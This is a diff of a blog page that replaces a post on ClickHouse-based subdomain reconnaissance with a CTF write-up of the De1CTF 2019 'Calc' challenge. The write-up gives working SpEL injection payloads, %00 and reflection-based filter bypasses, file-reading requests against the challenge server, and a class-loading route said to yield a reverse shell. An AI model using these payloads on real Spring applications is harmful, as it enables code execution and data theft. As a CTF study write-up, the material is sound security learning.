@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="渗透测试," />
+  <meta name="keywords" content="ctf,java," />
 
 
 
@@ -81,24 +81,22 @@
 
 
 
-<meta name="description" content="#介绍 ClickHouse是一个用于联机分析(OLAP)的列式数据库管理系统(DBMS)。 它不同于一般的关系数据库。像mysql，sqlserver都是以行为单位存储的，像这样：  但是clickhouse不是，它是以列式为单位存储的：  那么这样存储有什么不一样呢？ 在讲为什么之前我们首先先说一个概念：OLAP(来源百度百科) 1OLAP:联机分析处理OLAP是一种软件技术，它使分析人员能够">
+<meta name="description" content="De1ctf2019-Calc复现spel表达式注入，1.3.1以下存在的spring漏洞。 但是有过滤操作，拦截了包含不限于以下的关键字 1ProcessBuilder, getClass, java.lang, Runtime, &#39;#&#39;,T(,start  解法一：因为我们只是读取文件，我们可以用nio文件系统来读取，如果没有任何过滤我们可以构造以下payload去读取。 1j">
 <meta property="og:type" content="article">
-<meta property="og:title" content="利用clickhouse的信息搜集">
-<meta property="og:url" content="http://yoursite.com/2020/03/20/%E5%88%A9%E7%94%A8clickhouse%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
+<meta property="og:title" content="De1ctf2019-Calc复现">
+<meta property="og:url" content="http://yoursite.com/2020/05/07/De1tactf2019-Calc/index.html">
 <meta property="og:site_name" content="Da13&#39;s blog">
-<meta property="og:description" content="#介绍 ClickHouse是一个用于联机分析(OLAP)的列式数据库管理系统(DBMS)。 它不同于一般的关系数据库。像mysql，sqlserver都是以行为单位存储的，像这样：  但是clickhouse不是，它是以列式为单位存储的：  那么这样存储有什么不一样呢？ 在讲为什么之前我们首先先说一个概念：OLAP(来源百度百科) 1OLAP:联机分析处理OLAP是一种软件技术，它使分析人员能够">
-<meta property="og:image" content="https://s2.ax1x.com/2020/03/10/8iWQxS.png">
-<meta property="og:image" content="https://s2.ax1x.com/2020/03/10/8ifFJ0.png">
-<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gd08k1y5y5j31k408itd5.jpg">
-<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gd09b7lmrlj31j20ammzl.jpg">
-<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gd0bg62frcj31m402wwf7.jpg">
-<meta property="og:image" content="https://tva1.sinaimg.cn/large/00831rSTgy1gd0bq9ubjuj30u00ysqdn.jpg">
-<meta property="article:published_time" content="2020-03-20T05:24:00.159Z">
-<meta property="article:modified_time" content="2020-03-20T05:47:53.761Z">
+<meta property="og:description" content="De1ctf2019-Calc复现spel表达式注入，1.3.1以下存在的spring漏洞。 但是有过滤操作，拦截了包含不限于以下的关键字 1ProcessBuilder, getClass, java.lang, Runtime, &#39;#&#39;,T(,start  解法一：因为我们只是读取文件，我们可以用nio文件系统来读取，如果没有任何过滤我们可以构造以下payload去读取。 1j">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gek21z5au2j31rw0eiwij.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gek21cgcysj31660fwdiu.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gek21pxy4rj31sq0h0gr3.jpg">
+<meta property="article:published_time" content="2020-05-07T10:26:07.917Z">
+<meta property="article:modified_time" content="2020-05-07T10:26:07.918Z">
 <meta property="article:author" content="Da13">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.ax1x.com/2020/03/10/8iWQxS.png">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/007S8ZIlgy1gek21z5au2j31rw0eiwij.jpg">
 
 
 
@@ -128,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/03/20/利用clickhouse的信息搜集/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/05/07/De1tactf2019-Calc/"/>
 
 
 
 
 
-  <title>利用clickhouse的信息搜集 | Da13's blog</title>
+  <title>De1ctf2019-Calc复现 | Da13's blog</title>
   
 
 
@@ -271,7 +269,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/20/%E5%88%A9%E7%94%A8clickhouse%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/07/De1tactf2019-Calc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Da13">
@@ -288,7 +286,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">利用clickhouse的信息搜集</h1>
+          <h1 class="post-title" itemprop="name headline">De1ctf2019-Calc复现</h1>
         
 
         <div class="post-meta">
@@ -300,8 +298,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-20T13:24:00+08:00">
-                2020-03-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-07T18:26:07+08:00">
+                2020-05-07
               </time>
             
 
@@ -323,8 +321,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
                   </a>
                 </span>
 
@@ -360,76 +358,46 @@
       
 
       
-        <p>#介绍</p>
-<p>ClickHouse是一个用于联机分析(OLAP)的列式数据库管理系统(DBMS)。</p>
-<p>它不同于一般的关系数据库。像mysql，sqlserver都是以行为单位存储的，像这样：</p>
-<p><img src="https://s2.ax1x.com/2020/03/10/8iWQxS.png" alt=""></p>
-<p>但是clickhouse不是，它是以列式为单位存储的：</p>
-<p><img src="https://s2.ax1x.com/2020/03/10/8ifFJ0.png" alt=""></p>
-<p>那么这样存储有什么不一样呢？</p>
-<p>在讲为什么之前我们首先先说一个概念：OLAP(来源百度百科)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OLAP:联机分析处理OLAP是一种软件技术，它使分析人员能够迅速、一致、交互地从各个方面观察信息，以达到深入理解数据的目的。它具有FASMI(Fast Analysis of Shared Multidimensional Information)，即共享多维信息的快速分析的特征。</span><br></pre></td></tr></table></figure>
+        <h1 id="De1ctf2019-Calc复现"><a href="#De1ctf2019-Calc复现" class="headerlink" title="De1ctf2019-Calc复现"></a>De1ctf2019-Calc复现</h1><p>spel表达式注入，1.3.1以下存在的spring漏洞。</p>
+<p>但是有过滤操作，拦截了包含不限于以下的关键字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder, getClass, java.lang, Runtime, &#39;#&#39;,T(,start</span><br></pre></td></tr></table></figure>
 
-<p>也就是一个字，快！</p>
-<p><strong>OLAP场景的关键特征:</strong></p>
-<ul>
-<li>大多数是读请求</li>
-<li>数据总是以相当大的批(&gt; 1000 rows)进行写入</li>
-<li>不修改已添加的数据</li>
-<li>每次查询都从数据库中读取大量的行，但是同时又仅需要少量的列</li>
-<li>宽表，即每个表包含着大量的列</li>
-<li>较少的查询(通常每台服务器每秒数百个查询或更少)</li>
-<li>对于简单查询，允许延迟大约50毫秒</li>
-<li>列中的数据相对较小： 数字和短字符串(例如，每个URL 60个字节)</li>
-<li>处理单个查询时需要高吞吐量（每个服务器每秒高达数十亿行）</li>
-<li>事务不是必须的</li>
-<li>对数据一致性要求低</li>
-<li>每一个查询除了一个大表外都很小</li>
-<li>查询结果明显小于源数据，换句话说，数据被过滤或聚合后能够被盛放在单台服务器的内存中</li>
-</ul>
-<p>也就是说如果我们要从互联网上筛选大数据进行分析的话，需要存入数据库，即符合OLAP的应用特征。</p>
-<p>而相对于行数据库而言，列数据库是更适合OLAP场景的。原因在官方文档里面有很明确的说明<a href="https://clickhouse.tech/docs/zh/#input-output" target="_blank" rel="noopener">https://clickhouse.tech/docs/zh/#input-output</a></p>
-<p>通俗易懂的就是：</p>
-<ol>
-<li><p>行存储使用逐行处理模式，每次只处理一行数据；而列存储索引使用批处理模式，每次处理一批数据行。</p>
-</li>
-<li><p>行存储是逐行存储（Row Store），每一个Page存储多行数据，而列存储（Column Store）把数据表中的每一列单独存储在Page集合中，这意味着，Page集合中存储的是某一列的数据，而不是一行中所有列的数据。</p>
-<p>在读取数据时，行存储把一行的所有列都加载到内存，即使有些列根本不会用到；而列存储只把需要的列加载到内存中，不需要的列不会被加载到内存中。</p>
-</li>
-<li><p>列存储索引自动对数据进行压缩处理，由于同一行的数据具有很高的相似性，压缩率很高，数据读取更快速。</p>
-</li>
-</ol>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装之前先说一下，我用的parallels desktop虚拟机，内存我是4个g（越大越好）,1个T的硬盘，安装好后还要扩展一下虚拟空间，要不然还是很小的,以下连接是扩充的教程。</p>
-<p><a href="https://blog.csdn.net/weixin_40436144/article/details/86235432" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40436144/article/details/86235432</a></p>
-<p>在ubuntu下：</p>
-<p> 先在源文件加一句话：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;repo.yandex.ru&#x2F;clickhouse&#x2F;deb&#x2F;stable&#x2F; main&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h2><p>因为我们只是读取文件，我们可以用nio文件系统来读取，如果没有任何过滤我们可以构造以下payload去读取。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.nio.file.Files.readAllLines(java.nio.file.Paths.get(&#39;&#x2F;flag&#39;),java.nio.charset.Charset.defaultCharset())</span><br></pre></td></tr></table></figure>
+<p>然后转换成spel格式就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(&#39;&#x2F;flag&#39;),T(java.nio.charset.Charset).defaultCharset())</span><br></pre></td></tr></table></figure>
 
-<p>然后安装：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install dirmngr    # optional</span><br><span class="line">sudo apt-key adv --keyserver hkp:&#x2F;&#x2F;keyserver.ubuntu.com:80 --recv E0C56BD4    # optional</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install clickhouse-client clickhouse-server</span><br></pre></td></tr></table></figure>
+<p>但是这里对T(过滤了怎么办呢？</p>
+<p>在spel解析源码spring-expression-5.2.5.RELEASE.jar!/org/springframework/expression/spel/standard/Tokenizer.class中规定了对00截断字符进行空白符号处理，也就是说我们可以通过%00来绕过。</p>
+<p>（具体详见：<a href="https://landgrey.me/blog/15/?nsukey=XVe5A7dinIppwf2JitPxpna5tjYGXbzhZhI7CoIwOZiWXbCXOTC0pkyTrQW%2BTQdnF%2BZfHkcGU76mAebccU0AhQ6jy%2B%2BHJN1OgZX5b%2BhTYE46oeJp2rLtiBlWZeL8mlM4xESP0WSUGhAybv7au4PldgUTPqdEiguFHPpwwGO2dWfyHblxiMLkRbmmLtsl1X%2BMTWBUVD4cx0pm3JrwcGqCDA%3D%3D）" target="_blank" rel="noopener">https://landgrey.me/blog/15/?nsukey=XVe5A7dinIppwf2JitPxpna5tjYGXbzhZhI7CoIwOZiWXbCXOTC0pkyTrQW%2BTQdnF%2BZfHkcGU76mAebccU0AhQ6jy%2B%2BHJN1OgZX5b%2BhTYE46oeJp2rLtiBlWZeL8mlM4xESP0WSUGhAybv7au4PldgUTPqdEiguFHPpwwGO2dWfyHblxiMLkRbmmLtsl1X%2BMTWBUVD4cx0pm3JrwcGqCDA%3D%3D）</a></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get(&#39;&#x2F;flag&#39;),T%00(java.nio.charset.Charset).defaultCharset())</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gek21z5au2j31rw0eiwij.jpg" alt=""></p>
+<p>如果我们想弹shell怎么办呢？</p>
+<p>这里我们可以利用类加载的机制。</p>
+<p>spring中有个org.springframework.cglib.core.ReflectUtils类中有个defineClass的静态方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public static Class defineClass(String className, byte[] b, ClassLoader loader) throws Exception &#123;return defineClass(className, b, loader, PROTECTION_DOMAIN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>在centos7下建议用rpm安装，快一点（推荐）：</p>
-<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gd08k1y5y5j31k408itd5.jpg" alt=""></p>
-<p>可以在这里下载rpm包<br><a href="https://repo.yandex.ru/clickhouse/rpm/stable/x86_64/" target="_blank" rel="noopener">https://repo.yandex.ru/clickhouse/rpm/stable/x86_64/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh *.rpm</span><br></pre></td></tr></table></figure>
+<p>既然这里有定义类的，我们只要再去找到类加载的地方就行了。org.springframework.util.ClassUtils.getDefaultClassLoader()</p>
+<p>类加载细节可以参考这里 <a href="https://javasec.org/javase/ClassLoader/" target="_blank" rel="noopener">https://javasec.org/javase/ClassLoader/</a></p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T%00(org.springframework.cglib.core.ReflectUtils).defineClass(&#39;Singleton&#39;,T%00(com.sun.org.apache.xml.internal.security.utils.Base64).decode(&#39;构造的字节码的base64加密&#39;),T%00(org.springframework.util.ClassUtils).getDefaultClassLoader())</span><br></pre></td></tr></table></figure>
 
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>我用clickhouse去收集dns记录，就是看中了它的高效性的列存储。</p>
-<p>我下载了opendata上的fdns总共大概600个g左右，全部导入clickhouse。</p>
-<p>sql的增删改查基本上还是一样的。</p>
-<p>启动服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service clickhouse-server start</span><br></pre></td></tr></table></figure>
+<p>即可反弹shell，这里利用类加载绕过 openrasp 成功执行了自定义代码。</p>
+<h2 id="解法二-官方解法-："><a href="#解法二-官方解法-：" class="headerlink" title="解法二(官方解法)："></a>解法二(官方解法)：</h2><p>既然getclass被过滤了，咋们得想办法重新构造一个能取代getclass的方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;106.52.164.141&#x2F;spel&#x2F;calc?calc&#x3D;%27%27.class.getSuperclass().class</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gek21cgcysj31660fwdiu.jpg" alt=""></p>
+<p>这样就可以绕过getcalss的判断，Runtime可以用字符串拼接的方式绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;106.52.164.141&#x2F;spel&#x2F;calc?calc&#x3D;%27%27.class.getSuperclass().class.forName(%27java.la%27+%27ng.Run%27+%27time%27)</span><br></pre></td></tr></table></figure>
+<p>这里用到的forName是想利用java的反射来构造类.方法。具体可参考<a href="https://javasec.org/javase/Reflection/Reflection.html反射利用机制" target="_blank" rel="noopener">https://javasec.org/javase/Reflection/Reflection.html反射利用机制</a></p>
+<p>这里构造一个本身的payload：<br>java.nio.file.Files.readAllLines(java.nio.file.Paths.get(java.net.URI.create(java.lang.String(‘file://flag’)))))</p>
+<p>这里将这串payload进行“改装”成反射的加载形式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.class.forName(&quot;java.nio.file.Files&quot;).getMethod(&quot;readAllLines&quot;, 1.class.forName(&quot;java.nio.file.Path&quot;)).invoke(null, 1.class.forName(&quot;java.nio.file.Paths&quot;).getMethod(&quot;get&quot;, 1.class.forName(&quot;java.net.URI&quot;)).invoke(null, 1.class.forName(&quot;java.net.URI&quot;).getMethod(&quot;create&quot;, 1.class.forName(&quot;java.la&quot;+&quot;ng.Str&quot;+&quot;ing&quot;)).invoke(null, &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;)))</span><br></pre></td></tr></table></figure>
 
-<p>命令行连接服务：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo clickhouse-client</span><br></pre></td></tr></table></figure>
-
-<p>然后把数据导入数据库就ok了。没什么难度，官方手册上有详细说明。</p>
-<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gd09b7lmrlj31j20ammzl.jpg" alt=""></p>
-<p>可以看到这里搜索速度是每秒接近三百万行。如果是mysql这种行式数据库，就很慢了，得搜索很久了。</p>
-<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gd0bg62frcj31m402wwf7.jpg" alt=""></p>
-<p>最后看到有七十亿行的数据。</p>
-<p><img src="https://tva1.sinaimg.cn/large/00831rSTgy1gd0bq9ubjuj30u00ysqdn.jpg" alt=""></p>
-<p>最后我是针对某个src做的一个子域名信息搜集的结果。可以看到信息量还是很大的。</p>
-<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>clickhouse本身是适合集群工作的，这样可以充分发挥它的优势，但是限于资源有限，所以这个就只能留着以后有机会改进了。</p>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gek21pxy4rj31sq0h0gr3.jpg" alt=""></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最近才开始接触java，不得不说java是一个很有魅力的语言。特利用此题对之前学习的java内容进行巩固和训练。</p>
+<p>就此题而言，个人更推荐解法一，是因为解法一更巧妙并且可以加强对java代码以及类加载的理解。</p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>感谢De1ta的付出，比赛体验还是很不错的，题目质量也是很好，学到了很多！</p>
 
       
     </div>
@@ -447,7 +415,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/java/" rel="tag"># java</a>
           
         </div>
       
@@ -460,8 +430,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/03/14/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/" rel="next" title="Thinkphp5.0.24反序列化分析">
-                <i class="fa fa-chevron-left"></i> Thinkphp5.0.24反序列化分析
+              <a href="/2020/04/11/mysql%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86/" rel="next" title="mysql渗透测试笔记小结">
+                <i class="fa fa-chevron-left"></i> mysql渗透测试笔记小结
               </a>
             
           </div>
@@ -469,10 +439,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/03/24/Thinkphp5.0.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/" rel="prev" title="Thinkphp5.0.x代码执行分析">
-                Thinkphp5.0.x代码执行分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -645,7 +611,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安装"><span class="nav-number">1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用"><span class="nav-number">2.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结果"><span class="nav-number">3.</span> <span class="nav-text">结果</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思考"><span class="nav-number">4.</span> <span class="nav-text">思考</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#De1ctf2019-Calc复现"><span class="nav-number">1.</span> <span class="nav-text">De1ctf2019-Calc复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#解法一："><span class="nav-number">1.1.</span> <span class="nav-text">解法一：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解法二-官方解法-："><span class="nav-number">1.2.</span> <span class="nav-text">解法二(官方解法)：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最后"><span class="nav-number">1.4.</span> <span class="nav-text">最后</span></a></li></ol></li></ol></div>
             
 
           </div>
